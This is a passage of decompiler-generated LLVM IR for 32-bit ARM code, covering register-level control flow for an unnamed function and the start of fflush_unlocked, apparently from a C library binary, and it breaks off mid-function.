  br i1 %v2_16184, label %dec_label_pc_16190, label %dec_label_pc_161f0

dec_label_pc_16190:                               ; preds = %dec_label_pc_16174
  %v0_16190 = load i32, i32* %r3.global-to-local, align 4
  %v1_16190 = load i32, i32* %r0.global-to-local, align 4
  %v2_16190 = add i32 %v1_16190, 8
  %v3_16190 = inttoptr i32 %v2_16190 to i32*
  store i32 %v0_16190, i32* %v3_16190, align 4
  %v0_16194 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16194, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16198

dec_label_pc_16198:                               ; preds = %dec_label_pc_161c8.dec_label_pc_16198_crit_edge, %dec_label_pc_16190
  %v0_16198 = phi i32 [ %v0_16198.pre, %dec_label_pc_161c8.dec_label_pc_16198_crit_edge ], [ %v0_16194, %dec_label_pc_16190 ]
  %v1_16198 = inttoptr i32 %v0_16198 to i32*
  %v2_16198 = load i32, i32* %v1_16198, align 4
  store i32 %v2_16198, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16198, i32* %r2.global-to-local, align 4
  %v2_161a474 = load i32, i32* %v1_16198, align 4
  store i32 %v2_161a474, i32* %r3.global-to-local, align 4
  %v3_161a876 = icmp uge i32 %v2_161a474, %v2_16198
  store i1 %v3_161a876, i1* %cpsr_c.global-to-local, align 1
  %v9_161a882 = icmp eq i32 %v2_161a474, %v2_16198
  br i1 %v9_161a882, label %dec_label_pc_161b0, label %dec_label_pc_161c8

dec_label_pc_161b0:                               ; preds = %dec_label_pc_16198, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge
  %v0_161b083 = phi i32 [ %v1_161a8.pre, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge ], [ %v2_16198, %dec_label_pc_16198 ]
  store i32 %v0_161b083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161c0, label %dec_label_pc_161c4, label %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge

dec_label_pc_161b0.dec_label_pc_161a4_crit_edge:  ; preds = %dec_label_pc_161b0
  %v0_161a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161a8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_161a4 = inttoptr i32 %v0_161a4.pre to i32*
  %v2_161a4 = load i32, i32* %v1_161a4, align 4
  store i32 %v2_161a4, i32* %r3.global-to-local, align 4
  %v3_161a8 = icmp uge i32 %v2_161a4, %v1_161a8.pre
  store i1 %v3_161a8, i1* %cpsr_c.global-to-local, align 1
  %v9_161a8 = icmp eq i32 %v2_161a4, %v1_161a8.pre
  br i1 %v9_161a8, label %dec_label_pc_161b0, label %dec_label_pc_161c8

dec_label_pc_161c4:                               ; preds = %dec_label_pc_161b0
  %v0_161c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161c8

dec_label_pc_161c8:                               ; preds = %dec_label_pc_16198, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge, %dec_label_pc_161c4
  %v0_161d0 = phi i32 [ %v0_161c4, %dec_label_pc_161c4 ], [ %v2_161a474, %dec_label_pc_16198 ], [ %v2_161a4, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge ]
  %v1_161c8 = phi i32 [ %v0_161c4, %dec_label_pc_161c4 ], [ %v2_16198, %dec_label_pc_16198 ], [ %v1_161a8.pre, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge ]
  %v3_161c8 = icmp uge i32 %v0_161d0, %v1_161c8
  store i1 %v3_161c8, i1* %cpsr_c.global-to-local, align 1
  %v9_161c8 = icmp eq i32 %v0_161d0, %v1_161c8
  br i1 %v9_161c8, label %dec_label_pc_161d0, label %dec_label_pc_161c8.dec_label_pc_16198_crit_edge

dec_label_pc_161c8.dec_label_pc_16198_crit_edge:  ; preds = %dec_label_pc_161c8
  %v0_16198.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16198

dec_label_pc_161d0:                               ; preds = %dec_label_pc_161c8
  %v2_161d0 = icmp ne i32 %v1_161c8, 0
  store i1 %v2_161d0, i1* %cpsr_c.global-to-local, align 1
  %v7_161d4 = icmp slt i32 %v1_161c8, 2
  br i1 %v7_161d4, label %dec_label_pc_161f0, label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161d0
  %v0_161d8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_161d8, i32* %r0.global-to-local, align 4
  %v0_161dc = load i32, i32* %r1.global-to-local, align 4
  %v1_161dc = add i32 %v0_161dc, 129
  store i32 %v1_161dc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_161f0

dec_label_pc_161f0:                               ; preds = %dec_label_pc_16174, %dec_label_pc_161d8, %dec_label_pc_161d0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_161f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_161f4 = add i32 %v0_161f4, 80
  %v3_161f4 = inttoptr i32 %v2_161f4 to i32*
  %v4_161f4 = load i32, i32* %v3_161f4, align 4
  store i32 %v4_161f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_161fc = inttoptr i32 %v4_161f4 to i32*
  store i32 0, i32* %v2_161fc, align 4
  br label %dec_label_pc_16200

dec_label_pc_16200:                               ; preds = %dec_label_pc_16074, %dec_label_pc_1609c, %dec_label_pc_161f0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16204 = load i32, i32* %r5.global-to-local, align 4
  %v2_16204 = add i32 %v0_16204, 160
  %v3_16204 = inttoptr i32 %v2_16204 to i32*
  %v4_16204 = load i32, i32* %v3_16204, align 4
  store i32 %v4_16204, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1620c = add i32 %v0_16204, 12
  %v3_1620c = inttoptr i32 %v2_1620c to i32*
  %v4_1620c = load i32, i32* %v3_1620c, align 4
  store i32 %v4_1620c, i32* %r1.global-to-local, align 4
  %v1_16210 = add i32 %v4_16204, 4
  %v2_16210 = inttoptr i32 %v1_16210 to i32*
  %v3_16210 = load i32, i32* %v2_16210, align 4
  store i32 %v3_16210, i32* %r2.global-to-local, align 4
  %v1_16214 = inttoptr i32 %v4_1620c to i32*
  %v2_16214 = load i32, i32* %v1_16214, align 4
  %v1_16218 = add i32 %v3_16210, -1
  store i32 %v1_16218, i32* %r2.global-to-local, align 4
  %v1_1621c = add i32 %v2_16214, -1
  store i32 %v1_1621c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16220 = icmp eq i32 %v1_16218, 0
  store i32 %v1_1621c, i32* %v1_16214, align 4
  %v0_16228 = load i32, i32* %r2.global-to-local, align 4
  %v1_16228 = load i32, i32* %r0.global-to-local, align 4
  %v2_16228 = add i32 %v1_16228, 4
  %v3_16228 = inttoptr i32 %v2_16228 to i32*
  store i32 %v0_16228, i32* %v3_16228, align 4
  br i1 %v2_16220, label %dec_label_pc_16230, label %dec_label_pc_16290

dec_label_pc_16230:                               ; preds = %dec_label_pc_16200
  %v0_16230 = load i32, i32* %r2.global-to-local, align 4
  %v1_16230 = load i32, i32* %r0.global-to-local, align 4
  %v2_16230 = add i32 %v1_16230, 8
  %v3_16230 = inttoptr i32 %v2_16230 to i32*
  store i32 %v0_16230, i32* %v3_16230, align 4
  %v0_16234 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16234, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16238

dec_label_pc_16238:                               ; preds = %dec_label_pc_16268.dec_label_pc_16238_crit_edge, %dec_label_pc_16230
  %v0_16238 = phi i32 [ %v0_16238.pre, %dec_label_pc_16268.dec_label_pc_16238_crit_edge ], [ %v0_16234, %dec_label_pc_16230 ]
  %v1_16238 = inttoptr i32 %v0_16238 to i32*
  %v2_16238 = load i32, i32* %v1_16238, align 4
  store i32 %v2_16238, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16238, i32* %r2.global-to-local, align 4
  %v2_1624462 = load i32, i32* %v1_16238, align 4
  store i32 %v2_1624462, i32* %r3.global-to-local, align 4
  %v3_1624864 = icmp uge i32 %v2_1624462, %v2_16238
  store i1 %v3_1624864, i1* %cpsr_c.global-to-local, align 1
  %v9_1624870 = icmp eq i32 %v2_1624462, %v2_16238
  br i1 %v9_1624870, label %dec_label_pc_16250, label %dec_label_pc_16268

dec_label_pc_16250:                               ; preds = %dec_label_pc_16238, %dec_label_pc_16250.dec_label_pc_16244_crit_edge
  %v0_1625071 = phi i32 [ %v1_16248.pre, %dec_label_pc_16250.dec_label_pc_16244_crit_edge ], [ %v2_16238, %dec_label_pc_16238 ]
  store i32 %v0_1625071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16260 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16260, label %dec_label_pc_16264, label %dec_label_pc_16250.dec_label_pc_16244_crit_edge

dec_label_pc_16250.dec_label_pc_16244_crit_edge:  ; preds = %dec_label_pc_16250
  %v0_16244.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16248.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16244 = inttoptr i32 %v0_16244.pre to i32*
  %v2_16244 = load i32, i32* %v1_16244, align 4
  store i32 %v2_16244, i32* %r3.global-to-local, align 4
  %v3_16248 = icmp uge i32 %v2_16244, %v1_16248.pre
  store i1 %v3_16248, i1* %cpsr_c.global-to-local, align 1
  %v9_16248 = icmp eq i32 %v2_16244, %v1_16248.pre
  br i1 %v9_16248, label %dec_label_pc_16250, label %dec_label_pc_16268

dec_label_pc_16264:                               ; preds = %dec_label_pc_16250
  %v0_16264 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16268

dec_label_pc_16268:                               ; preds = %dec_label_pc_16238, %dec_label_pc_16250.dec_label_pc_16244_crit_edge, %dec_label_pc_16264
  %v0_16270 = phi i32 [ %v0_16264, %dec_label_pc_16264 ], [ %v2_1624462, %dec_label_pc_16238 ], [ %v2_16244, %dec_label_pc_16250.dec_label_pc_16244_crit_edge ]
  %v1_16268 = phi i32 [ %v0_16264, %dec_label_pc_16264 ], [ %v2_16238, %dec_label_pc_16238 ], [ %v1_16248.pre, %dec_label_pc_16250.dec_label_pc_16244_crit_edge ]
  %v3_16268 = icmp uge i32 %v0_16270, %v1_16268
  store i1 %v3_16268, i1* %cpsr_c.global-to-local, align 1
  %v9_16268 = icmp eq i32 %v0_16270, %v1_16268
  br i1 %v9_16268, label %dec_label_pc_16270, label %dec_label_pc_16268.dec_label_pc_16238_crit_edge

dec_label_pc_16268.dec_label_pc_16238_crit_edge:  ; preds = %dec_label_pc_16268
  %v0_16238.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16238

dec_label_pc_16270:                               ; preds = %dec_label_pc_16268
  %v2_16270 = icmp ne i32 %v1_16268, 0
  store i1 %v2_16270, i1* %cpsr_c.global-to-local, align 1
  %v7_16274 = icmp slt i32 %v1_16268, 2
  br i1 %v7_16274, label %dec_label_pc_16290, label %dec_label_pc_16278

dec_label_pc_16278:                               ; preds = %dec_label_pc_16270
  %v0_16278 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16278, i32* %r0.global-to-local, align 4
  %v0_1627c = load i32, i32* %r1.global-to-local, align 4
  %v1_1627c = add i32 %v0_1627c, 129
  store i32 %v1_1627c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16290

dec_label_pc_16290:                               ; preds = %dec_label_pc_16200, %dec_label_pc_16278, %dec_label_pc_16270
  %v2_16294 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16294, i32* %r4.global-to-local, align 4
  %v1_16298 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16298

; uselistorder directives
  uselistorder i32 %v0_16264, { 1, 0, 2 }
  uselistorder i32 %v1_16248.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16238, { 1, 0 }
  uselistorder i32 %v0_161c4, { 1, 0, 2 }
  uselistorder i32 %v1_161a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16198, { 1, 0 }
  uselistorder i32 %v0_16164, { 2, 1, 0 }
  uselistorder i32 %v0_16108, { 1, 0 }
  uselistorder i32 %v0_160ec, { 1, 0, 2 }
  uselistorder i32 %v1_160d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_160bc, { 1, 0 }
  uselistorder i32 %v0_16060, { 1, 0, 2 }
  uselistorder i32 %v1_16044.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16018, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 42, 5, 6, 7, 8, 9, 10, 11, 13, 12, 43, 14, 15, 16, 39, 40, 17, 18, 19, 20, 21, 22, 23, 25, 24, 44, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 0, 38, 41 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 22, 23, 4, 5, 6, 7, 26, 27, 8, 11, 9, 10, 21, 12, 13, 24, 25, 14, 15, 16, 17, 19, 18, 0, 20 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16290, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16268, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16250, { 1, 0 }
  uselistorder label %dec_label_pc_16200, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_161c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161b0, { 1, 0 }
  uselistorder label %dec_label_pc_16164, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1612c, { 1, 0 }
  uselistorder label %dec_label_pc_16100, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_160f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160d8, { 1, 0 }
  uselistorder label %dec_label_pc_16074, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16064, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1604c, { 1, 0 }
}

define i32 @function_162a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_162a0:
  %v0_162a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_162a0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_162a0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_162a0, %bb
  %v10_162b4 = phi i32 [ %arg1, %dec_label_pc_162a0 ], [ 0, %bb ]
  ret i32 %v10_162b4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_162b8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r6, align 4
  %v4_162c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 76) to i32*), align 4
  store i32 %v4_162c8, i32* %r3.global-to-local, align 4
  %v4_162cc = icmp uge i32 %tmp, %v4_162c8
  store i1 %v4_162cc, i1* %cpsr_c.global-to-local, align 1
  %v10_162cc = icmp eq i32 %tmp, %v4_162c8
  br i1 %v10_162cc, label %bb, label %dec_label_pc_162e4

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_162f4

dec_label_pc_162e4:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_162e8 = icmp eq i16* %arg1, null
  br i1 %v3_162e8, label %dec_label_pc_162f4, label %dec_label_pc_16608

dec_label_pc_162f4:                               ; preds = %bb, %dec_label_pc_162e4
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_162e4 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_162f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 160) to i32*), align 4
  store i32 %v4_162f8, i32* %r5.global-to-local, align 4
  %v0_162fc = call i32 @__aeabi_read_tp()
  store i32 %v0_162fc, i32* %r0.global-to-local, align 4
  %v1_16300 = add i32 %v4_162f8, 8
  %v2_16300 = inttoptr i32 %v1_16300 to i32*
  %v3_16300 = load i32, i32* %v2_16300, align 4
  store i32 %v3_16300, i32* %r3.global-to-local, align 4
  %v1_16304 = add i32 %v0_162fc, -1168
  store i32 %v1_16304, i32* %r8.global-to-local, align 4
  %v3_16308 = icmp uge i32 %v3_16300, %v1_16304
  store i1 %v3_16308, i1* %cpsr_c.global-to-local, align 1
  %v9_16308 = icmp eq i32 %v3_16300, %v1_16304
  br i1 %v9_16308, label %dec_label_pc_16350, label %dec_label_pc_16310

dec_label_pc_16310:                               ; preds = %dec_label_pc_162f4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_162f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1631c143 = inttoptr i32 %v4_162f8 to i32*
  %v2_1631c144 = load i32, i32* %v1_1631c143, align 4
  store i32 %v2_1631c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16320146 = icmp eq i32 %v2_1631c144, 0
  br i1 %v9_16320146, label %dec_label_pc_16328, label %dec_label_pc_16340

dec_label_pc_16328:                               ; preds = %dec_label_pc_16310, %dec_label_pc_16328.dec_label_pc_1631c_crit_edge
  %v0_16328147 = phi i32 [ %v1_16320.pre, %dec_label_pc_16328.dec_label_pc_1631c_crit_edge ], [ 0, %dec_label_pc_16310 ]
  store i32 %v0_16328147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16338 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16338, label %dec_label_pc_1633c, label %dec_label_pc_16328.dec_label_pc_1631c_crit_edge

dec_label_pc_16328.dec_label_pc_1631c_crit_edge:  ; preds = %dec_label_pc_16328
  %v0_1631c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16320.pre = load i32, i32* @r4, align 4
  %v1_1631c = inttoptr i32 %v0_1631c.pre to i32*
  %v2_1631c = load i32, i32* %v1_1631c, align 4
  store i32 %v2_1631c, i32* %r3.global-to-local, align 4
  %v3_16320 = icmp uge i32 %v2_1631c, %v1_16320.pre
  store i1 %v3_16320, i1* %cpsr_c.global-to-local, align 1
  %v9_16320 = icmp eq i32 %v2_1631c, %v1_16320.pre
  br i1 %v9_16320, label %dec_label_pc_16328, label %dec_label_pc_16340

dec_label_pc_1633c:                               ; preds = %dec_label_pc_16328
  %v0_1633c = load i32, i32* @r4, align 4
  store i32 %v0_1633c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16340

dec_label_pc_16340:                               ; preds = %dec_label_pc_16310, %dec_label_pc_16328.dec_label_pc_1631c_crit_edge, %dec_label_pc_1633c
  %v0_16340 = phi i32 [ %v0_1633c, %dec_label_pc_1633c ], [ %v2_1631c144, %dec_label_pc_16310 ], [ %v2_1631c, %dec_label_pc_16328.dec_label_pc_1631c_crit_edge ]
  %v1_16340 = phi i32 [ %v0_1633c, %dec_label_pc_1633c ], [ 0, %dec_label_pc_16310 ], [ %v1_16320.pre, %dec_label_pc_16328.dec_label_pc_1631c_crit_edge ]
  %v3_16340 = icmp uge i32 %v0_16340, %v1_16340
  store i1 %v3_16340, i1* %cpsr_c.global-to-local, align 1
  %v9_16340 = icmp eq i32 %v0_16340, %v1_16340
  br i1 %v9_16340, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16340
  %v1_16344 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16344, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16340, %bb65
  %v1_16348 = xor i1 %v9_16340, true
  call void @__pseudo_cond_branch(i1 %v1_16348, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_1634c = load i32, i32* %r8.global-to-local, align 4
  %v1_1634c = load i32, i32* %r5.global-to-local, align 4
  %v2_1634c = add i32 %v1_1634c, 8
  %v3_1634c = inttoptr i32 %v2_1634c to i32*
  store i32 %v0_1634c, i32* %v3_1634c, align 4
  br label %dec_label_pc_16350

dec_label_pc_16350:                               ; preds = %dec_label_pc_162f4, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16354 = load i32, i32* @r6, align 4
  %v2_16354 = add i32 %v0_16354, 160
  %v3_16354 = inttoptr i32 %v2_16354 to i32*
  %v4_16354 = load i32, i32* %v3_16354, align 4
  store i32 %v4_16354, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1635c = add i32 %v0_16354, 12
  %v3_1635c = inttoptr i32 %v2_1635c to i32*
  %v4_1635c = load i32, i32* %v3_1635c, align 4
  store i32 %v4_1635c, i32* %r2.global-to-local, align 4
  %v1_16360 = add i32 %v4_16354, 4
  %v2_16360 = inttoptr i32 %v1_16360 to i32*
  %v3_16360 = load i32, i32* %v2_16360, align 4
  store i32 %v3_16360, i32* %r1.global-to-local, align 4
  %v1_16364 = inttoptr i32 %v4_1635c to i32*
  %v2_16364 = load i32, i32* %v1_16364, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16368 = icmp eq i32 %v3_16360, 0
  %v1_1636c = add i32 %v2_16364, 1
  store i32 %v1_1636c, i32* %r3.global-to-local, align 4
  store i32 %v1_1636c, i32* %v1_16364, align 4
  br i1 %v2_16368, label %dec_label_pc_16378, label %dec_label_pc_163d8

dec_label_pc_16378:                               ; preds = %dec_label_pc_16350
  %v0_16378 = load i32, i32* %r1.global-to-local, align 4
  %v1_16378 = load i32, i32* %r0.global-to-local, align 4
  %v2_16378 = add i32 %v1_16378, 8
  %v3_16378 = inttoptr i32 %v2_16378 to i32*
  store i32 %v0_16378, i32* %v3_16378, align 4
  %v0_1637c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1637c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16380

dec_label_pc_16380:                               ; preds = %dec_label_pc_163b0.dec_label_pc_16380_crit_edge, %dec_label_pc_16378
  %v0_16380 = phi i32 [ %v0_16380.pre, %dec_label_pc_163b0.dec_label_pc_16380_crit_edge ], [ %v0_1637c, %dec_label_pc_16378 ]
  %v1_16380 = inttoptr i32 %v0_16380 to i32*
  %v2_16380 = load i32, i32* %v1_16380, align 4
  store i32 %v2_16380, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16380, i32* %r2.global-to-local, align 4
  %v2_1638c131 = load i32, i32* %v1_16380, align 4
  store i32 %v2_1638c131, i32* %r3.global-to-local, align 4
  %v3_16390133 = icmp uge i32 %v2_1638c131, %v2_16380
  store i1 %v3_16390133, i1* %cpsr_c.global-to-local, align 1
  %v9_16390139 = icmp eq i32 %v2_1638c131, %v2_16380
  br i1 %v9_16390139, label %dec_label_pc_16398, label %dec_label_pc_163b0

dec_label_pc_16398:                               ; preds = %dec_label_pc_16380, %dec_label_pc_16398.dec_label_pc_1638c_crit_edge
  %v0_16398140 = phi i32 [ %v1_16390.pre, %dec_label_pc_16398.dec_label_pc_1638c_crit_edge ], [ %v2_16380, %dec_label_pc_16380 ]
  store i32 %v0_16398140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_163a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_163a8, label %dec_label_pc_163ac, label %dec_label_pc_16398.dec_label_pc_1638c_crit_edge

dec_label_pc_16398.dec_label_pc_1638c_crit_edge:  ; preds = %dec_label_pc_16398
  %v0_1638c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16390.pre = load i32, i32* @r4, align 4
  %v1_1638c = inttoptr i32 %v0_1638c.pre to i32*
  %v2_1638c = load i32, i32* %v1_1638c, align 4
  store i32 %v2_1638c, i32* %r3.global-to-local, align 4
  %v3_16390 = icmp uge i32 %v2_1638c, %v1_16390.pre
  store i1 %v3_16390, i1* %cpsr_c.global-to-local, align 1
  %v9_16390 = icmp eq i32 %v2_1638c, %v1_16390.pre
  br i1 %v9_16390, label %dec_label_pc_16398, label %dec_label_pc_163b0

dec_label_pc_163ac:                               ; preds = %dec_label_pc_16398
  %v0_163ac = load i32, i32* @r4, align 4
  store i32 %v0_163ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163b0

dec_label_pc_163b0:                               ; preds = %dec_label_pc_16380, %dec_label_pc_16398.dec_label_pc_1638c_crit_edge, %dec_label_pc_163ac
  %v0_163b8 = phi i32 [ %v0_163ac, %dec_label_pc_163ac ], [ %v2_1638c131, %dec_label_pc_16380 ], [ %v2_1638c, %dec_label_pc_16398.dec_label_pc_1638c_crit_edge ]
  %v1_163b0 = phi i32 [ %v0_163ac, %dec_label_pc_163ac ], [ %v2_16380, %dec_label_pc_16380 ], [ %v1_16390.pre, %dec_label_pc_16398.dec_label_pc_1638c_crit_edge ]
  %v3_163b0 = icmp uge i32 %v0_163b8, %v1_163b0
  store i1 %v3_163b0, i1* %cpsr_c.global-to-local, align 1
  %v9_163b0 = icmp eq i32 %v0_163b8, %v1_163b0
  br i1 %v9_163b0, label %dec_label_pc_163b8, label %dec_label_pc_163b0.dec_label_pc_16380_crit_edge

dec_label_pc_163b0.dec_label_pc_16380_crit_edge:  ; preds = %dec_label_pc_163b0
  %v0_16380.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16380

dec_label_pc_163b8:                               ; preds = %dec_label_pc_163b0
  %v2_163b8 = icmp ne i32 %v1_163b0, 0
  store i1 %v2_163b8, i1* %cpsr_c.global-to-local, align 1
  %v7_163bc = icmp slt i32 %v1_163b0, 2
  br i1 %v7_163bc, label %dec_label_pc_163d8, label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %dec_label_pc_163b8
  %v0_163c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_163c0, i32* %r0.global-to-local, align 4
  %v0_163c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_163c4 = add i32 %v0_163c4, 129
  store i32 %v1_163c4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163d8

dec_label_pc_163d8:                               ; preds = %dec_label_pc_16350, %dec_label_pc_163c0, %dec_label_pc_163b8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_163dc = load i32, i32* @r6, align 4
  %v2_163dc = add i32 %v0_163dc, 152
  %v3_163dc = inttoptr i32 %v2_163dc to i32*
  %v4_163dc = load i32, i32* %v3_163dc, align 4
  store i32 %v4_163dc, i32* %r5.global-to-local, align 4
  %v1_163e0 = add i32 %v4_163dc, 8
  %v2_163e0 = inttoptr i32 %v1_163e0 to i32*
  %v3_163e0 = load i32, i32* %v2_163e0, align 4
  store i32 %v3_163e0, i32* %r3.global-to-local, align 4
  %v1_163e4 = load i32, i32* %r8.global-to-local, align 4
  %v3_163e4 = icmp uge i32 %v3_163e0, %v1_163e4
  store i1 %v3_163e4, i1* %cpsr_c.global-to-local, align 1
